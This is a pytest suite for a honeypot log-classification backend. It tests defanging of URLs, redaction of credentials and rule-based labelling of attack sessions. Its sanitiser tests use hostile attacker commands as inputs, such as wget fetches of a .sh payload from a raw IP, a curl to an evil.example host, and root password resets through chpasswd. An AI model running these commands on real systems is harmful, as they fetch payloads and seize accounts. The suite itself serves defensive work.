from datetime import datetime, timezone
from pathlib import Path

import pytest
from pydantic import ValidationError

from backend.catalog import ATTACK_TYPES
from backend.classify.rules import classify_rules
from backend.classify.session import (
    MAX_COMMANDS,
    WITHHELD,
    defang,
    evidence,
    safe_command,
    safe_text,
    safe_username,
)
from backend.classify.taxonomy import ABSTAIN, BY_KEY, CLASSES, DISPLAY_TYPE, KEYS, guide_text
from backend.models import Analysis, AttackEvent, Verdict
from backend.simulator import AttackSimulator
from tools.convert_cyberlab import build_record, convert_sessions

ROOT = Path(__file__).resolve().parent.parent
ASSUMED_START = datetime(2019, 5, 18, tzinfo=timezone.utc)
GEO = {"country_name": "X", "latitude": "10", "longitude": "10"}


def raw(eventid, stamp, **extra):
    return {"eventid": eventid, "timestamp": stamp, **extra}


def test_every_class_has_a_display_colour_and_every_technique_but_other():
    assert set(DISPLAY_TYPE) == set(KEYS)
    assert set(DISPLAY_TYPE.values()) <= set(ATTACK_TYPES)
    for c in CLASSES:
        assert (c.technique_id is None) == (c.key == "other")


def test_the_guide_lists_every_class_in_tie_break_order():
    guide = guide_text()
    positions = [guide.index(f"`{key}`") for key in KEYS]
    assert positions == sorted(positions)


def test_abstain_is_not_a_class():
    assert ABSTAIN not in KEYS


def test_text_from_attackers_loses_control_characters_and_angle_brackets():
    cleaned = safe_text("x<script>\r\n\x07y</session>")
    assert "<" not in cleaned and ">" not in cleaned and "\x07" not in cleaned
    assert "\n" not in cleaned


def test_urls_and_addresses_are_written_so_they_cannot_be_clicked():
    assert defang("wget http://203.0.113.9/x.sh") == "wget hxxp://203[.]0[.]113[.]9/x[.]sh"
    assert defang("curl https://evil.example.com") == "curl hxxps://evil[.]example[.]com"
    assert defang("ftp://a.b") == "fxp://a[.]b"


def test_a_command_that_may_carry_a_credential_is_withheld():
    for command in (
        "echo root:Hunter2|chpasswd",
        "passwd",
        "sshpass -p x ssh a",
        'echo "pi:pw" | x',
    ):
        assert safe_command(command) == WITHHELD


def test_a_password_inside_a_url_or_a_curl_option_never_survives():
    command = safe_command("wget ftp://admin:hunter2@10.0.0.5/payload")
    assert "hunter2" not in command and "admin" not in command
    assert command == "wget fxp://[credentials removed]@10[.]0[.]0[.]5/payload"
    assert "hunter2" not in safe_text("http://root:hunter2@evil.example/x")
    assert safe_command("curl -u root:hunter2 http://a.b/c") == WITHHELD
    assert safe_command("curl --user root:hunter2 http://a.b/c") == WITHHELD


def test_options_that_look_like_curl_flags_but_are_not_passwords_are_kept():
    assert safe_command("cp -u a b") == "cp -u a b"
    assert safe_command("mkdir -p /root/.ssh") == "mkdir -p /root/.ssh"


def test_an_ordinary_command_is_kept_and_defanged():
    assert safe_command("wget http://1.2.3.4/a") == "wget hxxp://1[.]2[.]3[.]4/a"
    assert safe_command("uname -a") == "uname -a"


def test_a_username_with_control_characters_or_too_long_is_dropped():
    assert safe_username("root") == "root"
    assert safe_username("ro\x00ot") is None
    assert safe_username("x" * 33) is None
    assert safe_username(None) is None


def test_the_record_never_holds_a_password_even_from_a_login_message():
    events = [
        raw(
            "cowrie.login.success",
            "2019-05-18T00:00:01Z",
            username="root",
            password="hunter2secret",
            message="login attempt [root/hunter2secret] succeeded",
        ),
        raw(
            "cowrie.command.success",
            "2019-05-18T00:00:02Z",
            message="Command found: echo root:hunter2secret|chpasswd",
        ),
        raw("cowrie.command.success", "2019-05-18T00:00:03Z", message="Command found: uname -a"),
    ]
    record = build_record("evt_1", ASSUMED_START, "X", "Y", events)
    text = record.model_dump_json()
    assert "hunter2secret" not in text
    assert record.commands == [WITHHELD, "uname -a"]
    assert record.usernames == ["root"]


def test_commands_are_read_only_from_command_events():
    events = [
        raw("cowrie.session.connect", "2019-05-18T00:00:00Z", message="Command found: sneaky"),
        raw("cowrie.command.success", "2019-05-18T00:00:01Z", message="Command found: id"),
        raw("cowrie.command.failed", "2019-05-18T00:00:02Z", message="Command not found: zzz"),
        raw("cowrie.command.success", "2019-05-18T00:00:03Z", message="something else"),
    ]
    record = build_record("evt_1", ASSUMED_START, "X", "Y", events)
    assert record.commands == ["id", "zzz"]
    assert record.commands_total == 2


def test_long_lists_are_cut_and_the_true_count_is_kept():
    events = [
        raw("cowrie.command.success", f"2019-05-18T00:00:{n:02d}Z", message=f"Command found: c{n}")
        for n in range(MAX_COMMANDS + 5)
    ]
    record = build_record("evt_1", ASSUMED_START, "X", "Y", events)
    assert len(record.commands) == MAX_COMMANDS
    assert record.commands_total == MAX_COMMANDS + 5
    assert f"first {MAX_COMMANDS} of {MAX_COMMANDS + 5}" in evidence(record)["commands run"]


def test_the_record_refuses_more_than_its_limits(make_record):
    with pytest.raises(ValidationError):
        make_record(commands=["c"] * (MAX_COMMANDS + 1))


def test_evidence_leaves_out_place_and_time(make_record):
    shown = " ".join(evidence(make_record(country="Ireland", city="Macroom")))
    assert "Ireland" not in shown and "Macroom" not in shown


def test_rules_follow_the_tie_break_order(make_record):
    cases = [
        (
            dict(
                downloads=["hxxp://a[.]b/x"], commands_total=2, tunnel_requests=3, login_attempts=4
            ),
            "malware_delivery",
        ),
        (
            dict(commands=["wget hxxp://a[.]b/x"], commands_total=1, login_attempts=1),
            "malware_delivery",
        ),
        (
            dict(commands=["uname -a"], commands_total=1, tunnel_requests=3, login_attempts=2),
            "post_login_commands",
        ),
        (dict(tunnel_requests=3, login_attempts=2), "proxy_tunnelling"),
        (dict(login_attempts=2), "credential_guessing"),
        (dict(), "scan_probe"),
    ]
    for fields, expected in cases:
        verdict = classify_rules(make_record(**fields))
        assert verdict.label == expected
        assert verdict.reasons and verdict.model is None
        if expected != "other":
            assert verdict.mitre.id == BY_KEY[expected].technique_id


def test_the_colour_category_always_comes_from_the_rules_label():
    sessions = {
        "a": [raw("cowrie.session.connect", "2019-05-18T00:00:00Z", geolocation_data=GEO)],
        "b": [
            raw("cowrie.login.failed", "2019-05-18T01:00:00Z", geolocation_data=GEO, username="x")
        ],
        "c": [raw("cowrie.direct-tcpip.request", "2019-05-18T02:00:00Z", geolocation_data=GEO)],
        "d": [
            raw(
                "cowrie.session.file_download",
                "2019-05-18T03:00:00Z",
                geolocation_data=GEO,
                url="http://a.b/c",
            )
        ],
    }
    records = []
    events, _ = convert_sessions(sessions, records)
    for event, record in zip(events, records, strict=True):
        assert event.attack_type == DISPLAY_TYPE[classify_rules(record).label]


def test_a_verdict_must_name_a_known_class_or_abstain():
    assert Verdict(label=ABSTAIN).label == ABSTAIN
    with pytest.raises(ValidationError):
        Verdict(label="constructor")
    with pytest.raises(ValidationError):
        Verdict(label="scan_probe", reasons=["x" * 161])


def test_free_text_from_the_model_cannot_travel_with_an_event():
    with pytest.raises(ValidationError, match="free text"):
        Analysis(rules=Verdict(label="scan_probe"), llm=Verdict(label="other", note="quotes a URL"))


def test_an_event_with_an_analysis_round_trips():
    event = AttackSimulator(seed=1).next_event()
    analysis = Analysis(rules=Verdict(label="scan_probe", reasons=["no login"]))
    again = AttackEvent.model_validate_json(
        event.model_copy(update={"analysis": analysis}).model_dump_json()
    )
    assert again.analysis.rules.label == "scan_probe"


def test_the_folder_for_local_data_is_not_committed():
    ignored = (ROOT / ".gitignore").read_text(encoding="utf-8").splitlines()
    assert "/local/" in ignored
